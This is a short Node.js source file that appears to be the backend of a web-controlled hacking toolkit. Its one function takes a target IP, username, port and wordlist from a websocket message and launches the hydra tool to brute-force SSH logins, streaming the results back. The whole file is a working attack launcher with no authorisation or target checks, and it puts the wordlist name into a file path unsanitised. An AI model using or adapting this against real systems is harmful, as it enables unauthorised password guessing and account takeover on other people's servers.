// import shell from "shelljs";
import { spawn } from "child_process";

export function handleSshBruteForce(ws, data) {
  const { ip, user, port, wordlist } = data;

  if (!ip || !user || !port || !wordlist) {
    ws.send(
      JSON.stringify({
        type: "error",
        data: "IP, User, Port and Wordlist are required",
      })
    );
    return;
  }

  const child = spawn("hydra", [
    "-t",
    "4",
    "-l",
    user,
    "-P",
    `../my-wordlists/${wordlist}`,
    `ssh://${ip}`,
    "-s",
    port,
  ]);

  child.stdout.on("data", (data) => {
    ws.send(JSON.stringify({ type: "ssh-brute-force", data: data.toString() }));
  });

  child.stderr.on("data", (data) => {
    ws.send(JSON.stringify({ type: "error", data: data.toString() }));
  });

  child.on("close", (code) => {
    ws.send(
      JSON.stringify({
        type: "ssh-brute-force-done",
        data: `child process exited with code ${code}`,
      })
    );
  });
}
